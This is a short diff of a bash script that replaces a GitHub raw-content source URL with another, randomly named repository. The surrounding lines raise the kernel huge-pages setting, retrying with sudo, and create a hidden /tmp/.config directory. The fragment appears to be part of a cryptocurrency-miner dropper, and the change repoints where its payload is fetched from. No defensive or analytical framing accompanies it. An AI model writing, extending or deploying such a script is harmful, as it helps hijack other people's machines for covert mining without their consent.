@@ -1,6 +1,6 @@
 #!/bin/bash
 
-src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
 sysctl -w vm.nr_hugepages=32768 || sudo sysctl -w vm.nr_hugepages=32768
 
 mkdir -p "/tmp/.config"
